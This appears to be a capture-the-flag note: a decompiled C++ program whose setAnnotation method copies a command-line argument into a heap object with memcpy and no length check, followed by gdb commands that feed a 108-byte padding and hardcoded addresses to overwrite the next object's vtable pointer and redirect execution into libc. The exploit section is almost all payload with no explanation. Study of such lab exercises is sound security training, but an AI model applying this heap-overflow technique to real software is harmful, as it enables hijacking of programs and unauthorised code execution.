//Constructor
void __thiscall N::N(N *this,int param_1)

{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

void __thiscall N::setAnnotation(N *this,char *param_1)

{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}


void main(int param_1,int param_2)

{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator.new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}


run `python -c "print('A'*108 + '\x10\xf9\xff\xbf')"` `python -c "print('\x99\x86\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\x7c\xea\xb7')"`

run `python -c "print('A'*108 + '\x10\xf9\xff\xbf')"` `python -c "print('\x58\x7c\xea\xb7' + '\xe0\xeb\xe5\xb7' + '\x60\xb0\xe6\xb7' + '\x99\x86\x04\x08')"`